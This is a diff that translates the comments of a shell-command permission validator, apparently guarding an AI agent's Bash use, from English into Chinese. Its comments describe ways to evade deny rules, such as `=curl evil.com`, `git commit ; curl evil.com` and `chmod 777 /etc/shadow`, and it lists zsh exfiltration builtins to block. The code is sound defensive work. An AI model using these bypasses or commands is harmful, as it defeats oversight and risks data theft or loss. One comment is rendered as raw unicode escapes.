@@ -11,16 +11,16 @@ import type { PermissionResult } from 'src/utils/permissions/PermissionResult.js
 
 const HEREDOC_IN_SUBSTITUTION = /\$\(.*<</
 
-// Note: Backtick pattern is handled separately in validateDangerousPatterns
-// to distinguish between escaped and unescaped backticks
+// 注意：反引号模式在 validateDangerousPatterns 中单独处理
+// 以区分转义和未转义的反引号
 const COMMAND_SUBSTITUTION_PATTERNS = [
   { pattern: /<\(/, message: 'process substitution <()' },
   { pattern: />\(/, message: 'process substitution >()' },
   { pattern: /=\(/, message: 'Zsh process substitution =()' },
-  // Zsh EQUALS expansion: =cmd at word start expands to $(which cmd).
-  // `=curl evil.com` → `/usr/bin/curl evil.com`, bypassing Bash(curl:*) deny
-  // rules since the parser sees `=curl` as the base command, not `curl`.
-  // Only matches word-initial = followed by a command-name char (not VAR=val).
+  // Zsh EQUALS 展开：词首的 =cmd 会展开为 $(which cmd)。
+  // `=curl evil.com` → `/usr/bin/curl evil.com`，绕过 Bash(curl:*) deny
+  // 规则，因为解析器把 `=curl` 视为基础命令，而不是 `curl`。
+  // 只匹配位于词首且后跟命令名字符的 =（不匹配 VAR=val）。
   {
     pattern: /(?:^|[\s;&|])=[a-zA-Z_]/,
     message: 'Zsh equals expansion (=cmd)',
@@ -36,45 +36,45 @@ const COMMAND_SUBSTITUTION_PATTERNS = [
     pattern: /\}\s*always\s*\{/,
     message: 'Zsh always block (try/always construct)',
   },
-  // Defense in depth: Block PowerShell comment syntax even though we don't execute in PowerShell
-  // Added as protection against future changes that might introduce PowerShell execution
+  // 纵深防御：即使我们不在 PowerShell 中执行，也屏蔽 PowerShell 注释语法
+  // 作为对未来可能引入 PowerShell 执行的变更的防护
   { pattern: /<#/, message: 'PowerShell comment syntax' },
 ]
 
-// Zsh-specific dangerous commands that can bypass security checks.
-// These are checked against the base command (first word) of each command segment.
+// Zsh 特有的危险命令，可绕过安全检查。
+// 这些会针对每个命令段的基础命令（第一个词）进行检查。
 const ZSH_DANGEROUS_COMMANDS = new Set([
-  // zmodload is the gateway to many dangerous module-based attacks:
-  // zsh/mapfile (invisible file I/O via array assignment),
-  // zsh/system (sysopen/syswrite two-step file access),
-  // zsh/zpty (pseudo-terminal command execution),
-  // zsh/net/tcp (network exfiltration via ztcp),
-  // zsh/files (builtin rm/mv/ln/chmod that bypass binary checks)
+  // zmodload 是许多基于模块的危险攻击的入口：
+  // zsh/mapfile（通过数组赋值进行隐形文件 I/O），
+  // zsh/system（sysopen/syswrite 两步式文件访问），
+  // zsh/zpty（伪终端命令执行），
+  // zsh/net/tcp（通过 ztcp 进行网络外泄），
+  // zsh/files（内建 rm/mv/ln/chmod，绕过二进制检查）
   'zmodload',
-  // emulate with -c flag is an eval-equivalent that executes arbitrary code
+  // 带 -c flag 的 emulate 是等价于 eval 的命令，会执行任意代码
   'emulate',
-  // Zsh module builtins that enable dangerous operations.
-  // These require zmodload first, but we block them as defense-in-depth
-  // in case zmodload is somehow bypassed or the module is pre-loaded.
-  'sysopen', // Opens files with fine-grained control (zsh/system)
-  'sysread', // Reads from file descriptors (zsh/system)
-  'syswrite', // Writes to file descriptors (zsh/system)
-  'sysseek', // Seeks on file descriptors (zsh/system)
-  'zpty', // Executes commands on pseudo-terminals (zsh/zpty)
-  'ztcp', // Creates TCP connections for exfiltration (zsh/net/tcp)
-  'zsocket', // Creates Unix/TCP sockets (zsh/net/socket)
-  'mapfile', // Not actually a command, but the associative array is set via zmodload
-  'zf_rm', // Builtin rm from zsh/files
-  'zf_mv', // Builtin mv from zsh/files
-  'zf_ln', // Builtin ln from zsh/files
-  'zf_chmod', // Builtin chmod from zsh/files
-  'zf_chown', // Builtin chown from zsh/files
-  'zf_mkdir', // Builtin mkdir from zsh/files
-  'zf_rmdir', // Builtin rmdir from zsh/files
-  'zf_chgrp', // Builtin chgrp from zsh/files
+  // 启用危险操作的 Zsh 模块内建命令。
+  // 这些命令需要先 zmodload，但我们作为纵深防御屏蔽它们，
+  // 以防 zmodload 被绕过或模块已预加载。
+  'sysopen', // 以细粒度控制打开文件（zsh/system）
+  'sysread', // 从文件描述符读取（zsh/system）
+  'syswrite', // 向文件描述符写入（zsh/system）
+  'sysseek', // 对文件描述符进行寻址（zsh/system）
+  'zpty', // 在伪终端上执行命令（zsh/zpty）
+  'ztcp', // 创建用于外泄的 TCP 连接（zsh/net/tcp）
+  'zsocket', // 创建 Unix/TCP 套接字（zsh/net/socket）
+  'mapfile', // 实际上不是命令，但关联数组通过 zmodload 设置
+  'zf_rm', // 来自 zsh/files 的内建 rm
+  'zf_mv', // 来自 zsh/files 的内建 mv
+  'zf_ln', // 来自 zsh/files 的内建 ln
+  'zf_chmod', // 来自 zsh/files 的内建 chmod
+  'zf_chown', // 来自 zsh/files 的内建 chown
+  'zf_mkdir', // 来自 zsh/files 的内建 mkdir
+  'zf_rmdir', // 来自 zsh/files 的内建 rmdir
+  'zf_chgrp', // 来自 zsh/files 的内建 chgrp
 ])
 
-// Numeric identifiers for bash security checks (to avoid logging strings)
+// bash 安全检查的数字标识符（避免记录字符串）
 const BASH_SECURITY_CHECK_IDS = {
   INCOMPLETE_COMMANDS: 1,
   JQ_SYSTEM_FUNCTION: 2,
@@ -107,23 +107,23 @@ type ValidationContext = {
   baseCommand: string
   unquotedContent: string
   fullyUnquotedContent: string
-  /** fullyUnquoted before stripSafeRedirections — used by validateBraceExpansion
-   * to avoid false negatives from redirection stripping creating backslash adjacencies */
+  /** stripSafeRedirections 之前的 fullyUnquoted —— validateBraceExpansion 使用，
+   * 以避免 redirection 剥离产生反斜杠相邻而导致的假阴性 */
   fullyUnquotedPreStrip: string
-  /** Like fullyUnquotedPreStrip but preserves quote characters ('/"): e.g.,
-   * echo 'x'# → echo ''# (the quote chars remain, revealing adjacency to #) */
+  /** 类似 fullyUnquotedPreStrip，但保留引号字符（'/"）：例如
+   * echo 'x'# → echo ''#（引号字符保留，暴露与 # 的相邻关系） */
   unquotedKeepQuoteChars: string
-  /** Tree-sitter analysis data, if available. Validators can use this for
-   * more accurate analysis when present, falling back to regex otherwise. */
+  /** Tree-sitter 分析数据（如果可用）。验证器在存在时可使用它进行
+   * 更精确的分析，否则回退到 regex。 */
   treeSitter?: TreeSitterAnalysis | null
 }
 
 type QuoteExtraction = {
   withDoubleQuotes: string
   fullyUnquoted: string
-  /** Like fullyUnquoted but preserves quote characters ('/"): strips quoted
-   * content while keeping the delimiters. Used by validateMidWordHash to detect
-   * quote-adjacent # (e.g., 'x'# where quote stripping would hide adjacency). */
+  /** 类似 fullyUnquoted，但保留引号字符（'/"）：剥离被引用的内容但保留
+   * 分隔符。validateMidWordHash 用它检测引号相邻的 #
+   * （例如 'x'#，若剥离引号会隐藏相邻关系）。 */
   unquotedKeepQuoteChars: string
 }
 
@@ -163,7 +163,7 @@ function extractQuotedContent(command: string, isJq = false): QuoteExtraction {
     if (char === '"' && !inSingleQuote) {
       inDoubleQuote = !inDoubleQuote
       unquotedKeepQuoteChars += char
-      // For jq, include quotes in extraction to ensure content is properly analyzed
+      // 对于 jq，在提取中包含引号以确保内容被正确分析
       if (!isJq) continue
     }
 
@@ -176,13 +176,13 @@ function extractQuotedContent(command: string, isJq = false): QuoteExtraction {
 }
 
 function stripSafeRedirections(content: string): string {
-  // SECURITY: All three patterns MUST have a trailing boundary (?=\s|$).
-  // Without it, `> /dev/nullo` matches `/dev/null` as a PREFIX, strips
-  // `> /dev/null` leaving `o`, so `echo hi > /dev/nullo` becomes `echo hi o`.
-  // validateRedirections then sees no `>` and passes. The file write to
-  // /dev/nullo is auto-allowed via the read-only path (checkReadOnlyConstraints).
-  // Main bashPermissions flow is protected (checkPathConstraints validates the
-  // original command), but speculation.ts uses checkReadOnlyConstraints alone.
+  // 安全性：三个模式都必须有尾部边界 (?=\s|$)。
+  // 否则，`> /dev/nullo` 会把 `/dev/null` 作为 PREFIX 匹配，剥离
+  // `> /dev/null` 留下 `o`，于是 `echo hi > /dev/nullo` 变成 `echo hi o`。
+  // validateRedirections 随后看不到 `>` 就放行。对 /dev/nullo 的文件写入
+  // 会通过只读路径（checkReadOnlyConstraints）自动允许。
+  // 主 bashPermissions 流程受保护（checkPathConstraints 校验原始命令），
+  // 但 speculation.ts 单独使用 checkReadOnlyConstraints。
   return content
     .replace(/\s+2\s*>&\s*1(?=\s|$)/g, '')
     .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, '')
@@ -190,23 +190,24 @@ function stripSafeRedirections(content: string): string {
 }
 
 /**
- * Checks if content contains an unescaped occurrence of a single character.
- * Handles bash escape sequences correctly where a backslash escapes the following character.
+ * 检查内容是否包含单个字符的未转义出现。
+ * 正确处理 bash 转义序列，其中反斜杠转义其后跟随的字符。
  *
- * IMPORTANT: This function only handles single characters, not strings. If you need to extend
- * this to handle multi-character strings, be EXTREMELY CAREFUL about shell ANSI-C quoting
+ * 重要：此函数只处理单个字符，不处理字符串。如果需要扩展
+ * 以处理多字符字符串，务必格外小心 shell 的 ANSI-C 引用
  * (e.g., $'\n', $'\x41', $'\u0041') which can encode arbitrary characters and strings in ways
- * that are very difficult to parse correctly. Incorrect handling could introduce security
- * vulnerabilities by allowing attackers to bypass security checks.
+ * 它们可以以极难正确解析的方式
+ * 编码任意字符和字符串。错误处理可能引入安全漏洞，
+ * 使攻击者能够绕过安全检查。
  *
- * @param content - The string to search (typically from extractQuotedContent)
- * @param char - Single character to search for (e.g., '`')
- * @returns true if unescaped occurrence found, false otherwise
+ * @param content - 要搜索的字符串（通常来自 extractQuotedContent）
+ * @param char - 要搜索的单个字符（例如 '`'）
+ * @returns 如果找到未转义的出现则返回 true，否则返回 false
  *
- * Examples:
- *   hasUnescapedChar("test \`safe\`", '`') → false (escaped backticks)
- *   hasUnescapedChar("test `dangerous`", '`') → true (unescaped backticks)
- *   hasUnescapedChar("test\\`date`", '`') → true (escaped backslash + unescaped backtick)
+ * 示例：
+ *   hasUnescapedChar("test \`safe\`", '`') → false（转义的反引号）
+ *   hasUnescapedChar("test `dangerous`", '`') → true（未转义的反引号）
+ *   hasUnescapedChar("test\\`date`", '`') → true（转义的反斜杠 + 未转义的反引号）
  */
 function hasUnescapedChar(content: string, char: string): boolean {
   if (char.length !== 1) {
@@ -215,21 +216,21 @@ function hasUnescapedChar(content: string, char: string): boolean {
 
   let i = 0
   while (i < content.length) {
-    // If we see a backslash, skip it and the next character (they form an escape sequence)
+    // 如果看到反斜杠，跳过它和下一个字符（它们组成一个转义序列）
     if (content[i] === '\\' && i + 1 < content.length) {
-      i += 2 // Skip backslash and escaped character
+      i += 2 // 跳过反斜杠和被转义的字符
       continue
     }
 
-    // Check if current character matches
+    // 检查当前字符是否匹配
     if (content[i] === char) {
-      return true // Found unescaped occurrence
+      return true // 找到未转义的出现
     }
 
     i++
   }
 
-  return false // No unescaped occurrences found
+  return false // 未找到未转义的出现
 }
 
 function validateEmpty(context: ValidationContext): PermissionResult {
@@ -288,41 +289,39 @@ function validateIncompleteCommands(
 }
 
 /**
- * Checks if a command is a "safe" heredoc-in-substitution pattern that can
- * bypass the generic $() validator.
+ * 检查命令是否是可绕过通用 $() 验证器的“安全” heredoc-in-substitution 模式。
  *
- * This is an EARLY-ALLOW path: returning `true` causes bashCommandIsSafe to
- * return `passthrough`, bypassing ALL subsequent validators. Given this
- * authority, the check must be PROVABLY safe, not "probably safe".
+ * 这是一个 EARLY-ALLOW 路径：返回 `true` 会导致 bashCommandIsSafe
+ * 返回 `passthrough`，绕过所有后续验证器。鉴于此权限，
+ * 该检查必须是可证明安全的，而不是“大概安全”。
  *
- * The only pattern we allow is:
+ * 我们只允许以下模式：
  *   [prefix] $(cat <<'DELIM'\n
  *   [body lines]\n
  *   DELIM\n
  *   ) [suffix]
  *
- * Where:
- * - The delimiter must be single-quoted ('DELIM') or escaped (\DELIM) so the
- *   body is literal text with no expansion
- * - The closing delimiter must be on a line BY ITSELF (or with only trailing
- *   whitespace + `)` for the $(cat <<'EOF'\n...\nEOF)` inline form)
- * - The closing delimiter must be the FIRST such line — matching bash's
- *   behavior exactly (no skipping past early delimiters to find EOF))
- * - There must be non-whitespace text BEFORE the $( (i.e., the substitution
- *   is used in argument position, not as a command name). Otherwise the
- *   heredoc body becomes an arbitrary command name with [suffix] as args.
- * - The remaining text (with the heredoc stripped) must pass all validators
+ * 其中：
+ * - 分隔符必须单引号引用（'DELIM'）或转义（\DELIM），这样
+ *   body 是字面文本，不做展开
+ * - 结束分隔符必须单独占一行（或者对于 $(cat <<'EOF'\n...\nEOF)` 内联形式，
+ *   只允许尾部空白 + `)`）
+ * - 结束分隔符必须是第一个这样的行 —— 精确匹配 bash 的行为
+ *   （不会跳过早期分隔符去查找 EOF））
+ * - 在 $( 之前必须有非空白文本（即替换用于参数位置，
+ *   而不是命令名）。否则 heredoc body 会成为任意命令名，[suffix] 作为参数。
+ * - 剥离 heredoc 后的剩余文本必须通过所有验证器
  *
- * This implementation uses LINE-BASED matching, not regex [\s\S]*?, to
- * precisely replicate bash's heredoc-closing behavior.
+ * 此实现使用基于行的匹配，而非 regex [\s\S]*?，
+ * 以精确复刻 bash 的 heredoc 关闭行为。
  */
 function isSafeHeredoc(command: string): boolean {
   if (!HEREDOC_IN_SUBSTITUTION.test(command)) return false
 
-  // SECURITY: Use [ \t] (not \s) between << and the delimiter. \s matches
-  // newlines, but bash requires the delimiter word on the same line as <<.
-  // Matching across newlines could accept malformed syntax that bash rejects.
-  // Handle quote variations: 'EOF', ''EOF'' (splitCommand may mangle quotes).
+  // 安全性：在 << 和分隔符之间使用 [ \t]（而非 \s）。\s 会匹配
+  // 换行符，但 bash 要求分隔符词与 << 在同一行。
+  // 跨换行匹配可能接受 bash 会拒绝的畸形语法。
+  // 处理引号变体：'EOF'、''EOF''（splitCommand 可能破坏引号）。
   const heredocPattern =
     /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
   let match
@@ -346,109 +345,105 @@ function isSafeHeredoc(command: string): boolean {
     }
   }
 
-  // If no safe heredoc patterns found, it's not safe
+  // 如果未找到安全 heredoc 模式，则不安全
   if (safeHeredocs.length === 0) return false
 
-  // SECURITY: For each heredoc, find the closing delimiter using LINE-BASED
-  // matching that exactly replicates bash's behavior. Bash closes a heredoc
-  // at the FIRST line that exactly matches the delimiter. Any subsequent
-  // occurrence of the delimiter is just content (or a new command). Regex
-  // [\s\S]*? can skip past the first delimiter to find a later `DELIM)`
-  // pattern, hiding injected commands between the two delimiters.
+  // 安全性：对每个 heredoc，使用基于行的匹配查找结束分隔符，
+  // 该匹配精确复刻 bash 的行为。bash 在第一个与分隔符完全匹配的行
+  // 关闭 heredoc。分隔符的任何后续出现都只是内容（或新命令）。Regex
+  // [\s\S]*? 可能跳过第一个分隔符去查找稍后的 `DELIM)`
+  // 模式，从而隐藏两个分隔符之间注入的命令。
   type VerifiedHeredoc = { start: number; end: number }
   const verified: VerifiedHeredoc[] = []
 
   for (const { start, operatorEnd, delimiter, isDash } of safeHeredocs) {
-    // The opening line must end immediately after the delimiter (only
-    // horizontal whitespace allowed before the newline). If there's other
-    // content (like `; rm -rf /`), this is not a simple safe heredoc.
+    // 起始行必须在分隔符后立即结束（换行前只允许水平空白）。
+    // 如果有其他内容（如 `; rm -rf /`），则不是简单的安全 heredoc。
     const afterOperator = command.slice(operatorEnd)
     const openLineEnd = afterOperator.indexOf('\n')
-    if (openLineEnd === -1) return false // No content at all
+    if (openLineEnd === -1) return false // 完全没有内容
     const openLineTail = afterOperator.slice(0, openLineEnd)
-    if (!/^[ \t]*$/.test(openLineTail)) return false // Extra content on open line
+    if (!/^[ \t]*$/.test(openLineTail)) return false // 起始行有额外内容
 
-    // Body starts after the newline
+    // body 从换行后开始
     const bodyStart = operatorEnd + openLineEnd + 1
     const body = command.slice(bodyStart)
     const bodyLines = body.split('\n')
 
-    // Find the FIRST line that closes the heredoc. There are two valid forms:
-    //   1. `DELIM` alone on a line (bash-standard), followed by `)` on the
-    //      next line (with only whitespace before it)
-    //   2. `DELIM)` on a line (the inline $(cat <<'EOF'\n...\nEOF) form,
-    //      where bash's PST_EOFTOKEN closes both heredoc and substitution)
-    // For <<-, leading tabs are stripped before matching.
+    // 查找第一行关闭 heredoc 的行。有两种有效形式：
+    //   1. `DELIM` 单独占一行（bash 标准），下一行是 `)`
+    //      （之前只允许空白）
+    //   2. `DELIM)` 在同一行（内联 $(cat <<'EOF'\n...\nEOF) 形式，
+    //      bash 的 PST_EOFTOKEN 同时关闭 heredoc 和替换）
+    // 对于 <<-，匹配前会剥离前导制表符。
     let closingLineIdx = -1
-    let closeParenLineIdx = -1 // Line index where `)` appears
-    let closeParenColIdx = -1 // Column index of `)` on that line
+    let closeParenLineIdx = -1 // `)` 所在的行索引
+    let closeParenColIdx = -1 // 该行上 `)` 的列索引
 
     for (let i = 0; i < bodyLines.length; i++) {
       const rawLine = bodyLines[i]!
       const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine
 
-      // Form 1: delimiter alone on a line
+      // 形式 1：分隔符单独占一行
       if (line === delimiter) {
         closingLineIdx = i
-        // The `)` must be on the NEXT line with only whitespace before it
+        // `)` 必须在下一行，且之前只允许空白
         const nextLine = bodyLines[i + 1]
-        if (nextLine === undefined) return false // No closing `)`
+        if (nextLine === undefined) return false // 没有结束 `)`
         const parenMatch = nextLine.match(/^([ \t]*)\)/)
-        if (!parenMatch) return false // `)` not at start of next line
+        if (!parenMatch) return false // `)` 不在下一行开头
         closeParenLineIdx = i + 1
-        closeParenColIdx = parenMatch[1]!.length // Position of `)`
+        closeParenColIdx = parenMatch[1]!.length // `)` 的位置
         break
       }
 
-      // Form 2: delimiter immediately followed by `)` (PST_EOFTOKEN form)
-      // Only whitespace allowed between delimiter and `)`.
+      // 形式 2：分隔符紧跟 `)`（PST_EOFTOKEN 形式）
+      // 分隔符和 `)` 之间只允许空白。
       if (line.startsWith(delimiter)) {
         const afterDelim = line.slice(delimiter.length)
         const parenMatch = afterDelim.match(/^([ \t]*)\)/)
         if (parenMatch) {
           closingLineIdx = i
           closeParenLineIdx = i
-          // Column is in rawLine (pre-tab-strip), so recompute
+          // 列号在 rawLine 中（剥离制表符前），所以重新计算
           const tabPrefix = isDash ? (rawLine.match(/^\t*/)?.[0] ?? '') : ''
           closeParenColIdx =
             tabPrefix.length + delimiter.length + parenMatch[1]!.length
           break
         }
-        // Line starts with delimiter but has other trailing content —
-        // this is NOT the closing line (bash requires exact match or EOF`)`).
-        // But it's also a red flag: if this were inside $(), bash might
-        // close early via PST_EOFTOKEN with other shell metacharacters.
-        // We already handle that case in extractHeredocs — here we just
-        // reject it as not matching our safe pattern.
+        // 行以分隔符开头但有其他尾部内容 ——
+        // 这不是结束行（bash 要求精确匹配或 EOF`)`）。
+        // 但这也是危险信号：如果这在 $() 内，bash 可能通过
+        // PST_EOFTOKEN 与其他 shell 元字符提前关闭。
+        // 我们已在 extractHeredocs 中处理该情况 —— 这里只是
+        // 拒绝它，因为不匹配我们的安全模式。
         if (/^[)}`|&;(<>]/.test(afterDelim)) {
-          return false // Ambiguous early-closure pattern
+          return false // 模糊的提前关闭模式
         }
       }
     }
 
-    if (closingLineIdx === -1) return false // No closing delimiter found
+    if (closingLineIdx === -1) return false // 未找到结束分隔符
 
-    // Compute the absolute end position (one past the `)` character)
+    // 计算绝对结束位置（`)` 字符之后一位）
     let endPos = bodyStart
     for (let i = 0; i < closeParenLineIdx; i++) {
-      endPos += bodyLines[i]!.length + 1 // +1 for newline
+      endPos += bodyLines[i]!.length + 1 // +1 对应换行符
     }
-    endPos += closeParenColIdx + 1 // +1 to include the `)` itself
+    endPos += closeParenColIdx + 1 // +1 以包含 `)` 本身
 
     verified.push({ start, end: endPos })
   }
 
-  // SECURITY: Reject nested matches. The regex finds $(cat <<'X' patterns
-  // in RAW TEXT without understanding quoted-heredoc semantics. When the
-  // outer heredoc has a quoted delimiter (<<'A'), its body is LITERAL text
-  // in bash — any inner $(cat <<'B' is just characters, not a real heredoc.
-  // But our regex matches both, producing NESTED ranges. Stripping nested
-  // ranges corrupts indices: after stripping the inner range, the outer
-  // range's `end` is stale (points past the shrunken string), causing
-  // `remaining.slice(end)` to return '' and silently drop any suffix
-  // (e.g., `; rm -rf /`). Since all our matched heredocs have quoted/escaped
-  // delimiters, a nested match inside the body is ALWAYS literal text —
-  // no legitimate user writes this pattern. Bail to safe fallback.
+  // 安全性：拒绝嵌套匹配。regex 在原始文本中查找 $(cat <<'X' 模式，
+  // 不理解 quoted-heredoc 语义。当外层 heredoc 有引号分隔符（<<'A'）时，
+  // 其 body 在 bash 中是字面文本 —— 任何内部 $(cat <<'B' 只是字符，
+  // 不是真正的 heredoc。但我们的 regex 同时匹配两者，产生嵌套范围。
+  // 剥离嵌套范围会破坏索引：剥离内部范围后，外部范围的 `end` 过期
+  // （指向缩短后字符串之后），导致 `remaining.slice(end)` 返回 ''
+  // 并静默丢弃任何后缀（例如 `; rm -rf /`）。由于我们所有匹配的 heredoc
+  // 都有引号/转义分隔符，body 内的嵌套匹配始终是字面文本 ——
+  // 没有合法用户会写这种模式。退回到安全回退。
   for (const outer of verified) {
     for (const inner of verified) {
       if (inner === outer) continue
@@ -458,57 +453,54 @@ function isSafeHeredoc(command: string): boolean {
     }
   }
 
-  // Strip all verified heredocs from the command, building `remaining`.
-  // Process in reverse order so earlier indices stay valid.
+  // 从命令中剥离所有已验证的 heredoc，构建 `remaining`。
+  // 按倒序处理以保持早期索引有效。
   const sortedVerified = [...verified].sort((a, b) => b.start - a.start)
   let remaining = command
   for (const { start, end } of sortedVerified) {
     remaining = remaining.slice(0, start) + remaining.slice(end)
   }
 
-  // SECURITY: The remaining text must NOT start with only whitespace before
-  // the (now-stripped) heredoc position IF there's non-whitespace after it.
-  // If the $() is in COMMAND-NAME position (no prefix), its output becomes
-  // the command to execute, with any suffix text as arguments:
+  // 安全性：如果（已剥离的）heredoc 位置之后有非空白文本，
+  // 则剩余文本不得仅以空白开头。
+  // 如果 $() 处于命令名位置（无 prefix），其输出会成为要执行的命令，
+  // 任何后缀文本作为参数：
   //   $(cat <<'EOF'\nchmod\nEOF\n) 777 /etc/shadow
-  //   → runs `chmod 777 /etc/shadow`
-  // We only allow the substitution in ARGUMENT position: there must be a
-  // command word before the $(.
-  // After stripping, `remaining` should look like `cmd args... [more args]`.
-  // If remaining starts with only whitespace (or is empty), the $() WAS the
-  // command — that's only safe if there are no trailing arguments.
+  //   → 运行 `chmod 777 /etc/shadow`
+  // 我们只允许替换处于参数位置：$( 之前必须有命令词。
+  // 剥离后，`remaining` 应类似 `cmd args... [more args]`。
+  // 如果 remaining 仅以空白开头（或为空），则 $() 就是命令 ——
+  // 只有在没有尾随参数时才安全。
   const trimmedRemaining = remaining.trim()
   if (trimmedRemaining.length > 0) {
-    // There's a prefix command — good. But verify the original command
-    // also had a non-whitespace prefix before the FIRST $( (the heredoc
-    // could be one of several; we need the first one's prefix).
+    // 有 prefix 命令 —— 很好。但验证原始命令在第一个 $( 之前
+    // 也有非空白 prefix（heredoc 可能有多个；我们需要第一个的 prefix）。
     const firstHeredocStart = Math.min(...verified.map(v => v.start))
     const prefix = command.slice(0, firstHeredocStart)
     if (prefix.trim().length === 0) {
-      // $() is in command-name position but there's trailing text — UNSAFE.
-      // The heredoc body becomes the command name, trailing text becomes args.
+      // $() 处于命令名位置但有尾随文本 —— 不安全。
+      // heredoc body 成为命令名，尾随文本成为参数。
       return false
     }
   }
 
-  // Check that remaining text contains only safe characters.
-  // After stripping safe heredocs, the remaining text should only be command
-  // names, arguments, quotes, and whitespace. Reject ANY shell metacharacter
-  // to prevent operators (|, &, &&, ||, ;) or expansions ($, `, {, <, >) from
-  // being used to chain dangerous commands after a safe heredoc.
-  // SECURITY: Use explicit ASCII space/tab only — \s matches unicode whitespace
-  // like \u00A0 which can be used to hide content. Newlines are also blocked
-  // (they would indicate multi-line commands outside the heredoc body).
+  // 检查剩余文本只包含安全字符。
+  // 剥离安全 heredoc 后，剩余文本应只是命令名、参数、引号和空白。
+  // 拒绝任何 shell 元字符，以防止操作符（|、&、&&、||、;）或展开
+  // （$、`、{、<、>）用于在安全 heredoc 之后链接危险命令。
+  // 安全性：只使用显式 ASCII 空格/制表符 —— \s 会匹配 unicode 空白
+  // \u5982 \u00A0\uFF0C\u53EF\u7528\u4E8E\u9690\u85CF\u5185\u5BB9\u3002\u6362\u884C\u7B26\u4E5F\u88AB\u5C4F\u853D
+  // \uFF08\u5B83\u4EEC\u8868\u793A heredoc body \u4E4B\u5916\u7684\u591A\u884C\u547D\u4EE4\uFF09\u3002
   if (!/^[a-zA-Z0-9 \t"'.\-/_@=,:+~]*$/.test(remaining)) return false
 
-  // SECURITY: The remaining text (command with heredocs stripped) must also
-  // pass all security validators. Without this, appending a safe heredoc to a
-  // dangerous command (e.g., `zmodload zsh/system $(cat <<'EOF'\nx\nEOF\n)`)
-  // causes this early-allow path to return passthrough, bypassing
-  // validateZshDangerousCommands, validateProcEnvironAccess, and any other
-  // main validator that checks allowlist-safe character patterns.
-  // No recursion risk: `remaining` has no `$(... <<` pattern, so the recursive
-  // call's validateSafeCommandSubstitution returns passthrough immediately.
+  // 安全性：剩余文本（剥离 heredoc 后的命令）也必须
+  // 通过所有安全验证器。否则，将安全 heredoc 追加到危险命令
+  // （例如 `zmodload zsh/system $(cat <<'EOF'\nx\nEOF\n)`）
+  // 会导致此提前允许路径返回 passthrough，绕过
+  // validateZshDangerousCommands、validateProcEnvironAccess 以及任何其他
+  // 检查 allowlist 安全字符模式的主验证器。
+  // 无递归风险：`remaining` 没有 `$(... <<` 模式，所以递归
+  // 调用的 validateSafeCommandSubstitution 会立即返回 passthrough。
   if (bashCommandIsSafe_DEPRECATED(remaining).behavior !== 'passthrough')
     return false
 
@@ -516,9 +508,9 @@ function isSafeHeredoc(command: string): boolean {
 }
 
 /**
- * Detects well-formed $(cat <<'DELIM'...DELIM) heredoc substitution patterns.
- * Returns the command with matched heredocs stripped, or null if none found.
- * Used by the pre-split gate to strip safe heredocs and re-check the remainder.
+ * 检测格式良好的 $(cat <<'DELIM'...DELIM) heredoc 替换模式。
+ * 返回剥离匹配 heredoc 后的命令，如果未找到则返回 null。
+ * 供 pre-split gate 使用，以剥离安全 heredoc 并重新检查剩余部分。
  */
 export function stripSafeHeredocSubstitutions(command: string): string | null {
   if (!HEREDOC_IN_SUBSTITUTION.test(command)) return null
@@ -579,7 +571,7 @@ export function stripSafeHeredocSubstitutions(command: string): string | null {
   return result
 }
 
-/** Detection-only check: does the command contain a safe heredoc substitution? */
+/** 仅检测：命令是否包含安全 heredoc 替换？ */
 export function hasSafeHeredocSubstitution(command: string): boolean {
   return stripSafeHeredocSubstitutions(command) !== null
 }
@@ -618,9 +610,9 @@ function validateGitCommit(context: ValidationContext): PermissionResult {
     return { behavior: 'passthrough', message: 'Not a git commit' }
   }
 
-  // SECURITY: Backslashes can cause our regex to mis-identify quote boundaries
-  // (e.g., `git commit -m "test\"msg" && evil`). Legitimate commit messages
-  // virtually never contain backslashes, so bail to the full validator chain.
+  // 安全性：反斜杠会导致我们的 regex 错误识别引号边界
+  // （例如 `git commit -m "test\"msg" && evil`）。合法的提交消息
+  // 几乎从不包含反斜杠，所以退回到完整验证器链。
   if (originalCommand.includes('\\')) {
     return {
       behavior: 'passthrough',
@@ -628,21 +620,21 @@ function validateGitCommit(context: ValidationContext): PermissionResult {
     }
   }
 
-  // SECURITY: The `.*?` before `-m` must NOT match shell operators. Previously
-  // `.*?` matched anything except `\n`, including `;`, `&`, `|`, `` ` ``, `$(`.
-  // For `git commit ; curl evil.com -m 'x'`, `.*?` swallowed `; curl evil.com `
-  // leaving remainder=`` (falsy → remainder check skipped) → returned `allow`
-  // for a compound command. Early-allow skips ALL main validators (line ~1908),
-  // nullifying validateQuotedNewline, validateBackslashEscapedOperators, etc.
-  // While splitCommand currently catches this downstream, early-allow is a
-  // POSITIVE ASSERTION that the FULL command is safe — which it is NOT.
+  // 安全性：`-m` 之前的 `.*?` 不得匹配 shell 操作符。此前
+  // `.*?` 匹配除 `\n` 外的任何字符，包括 `;`、`&`、`|`、`` ` ``、`$(`。
+  // 对于 `git commit ; curl evil.com -m 'x'`，`.*?` 吞掉了 `; curl evil.com `
+  // 留下 remainder=``（falsy → 跳过 remainder 检查）→ 对复合命令
+  // 返回 `allow`。提前允许会跳过所有主验证器（约第 1908 行），
+  // 使 validateQuotedNewline、validateBackslashEscapedOperators 等失效。
+  // 虽然 splitCommand 目前在下游捕获此情况，但提前允许是
+  // 对完整命令安全的正面断言 —— 而它并不安全。
   //
-  // Also: `\s+` between `git` and `commit` must NOT match `\n`/`\r` (command
-  // separators in bash). Use `[ \t]+` for horizontal-only whitespace.
+  // 另外：`git` 和 `commit` 之间的 `\s+` 不得匹配 `\n`/`\r`
+  // （bash 中的命令分隔符）。使用 `[ \t]+` 仅匹配水平空白。
   //
-  // The `[^;&|`$<>()\n\r]*?` class excludes shell metacharacters. We also
-  // exclude `<` and `>` here (redirects) — they're allowed in the REMAINDER
-  // for `--author="Name <email>"` but must not appear BEFORE `-m`.
+  // `[^;&|`$<>()\n\r]*?` 字符类排除 shell 元字符。我们在这里
+  // 也排除 `<` 和 `>`（redirect）—— 它们在 REMAINDER 中是允许的
+  // （用于 `--author="Name <email>"`），但不得出现在 `-m` 之前。
   const messageMatch = originalCommand.match(
     /^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/,
   )
@@ -661,23 +653,23 @@ function validateGitCommit(context: ValidationContext): PermissionResult {
       }
     }
 
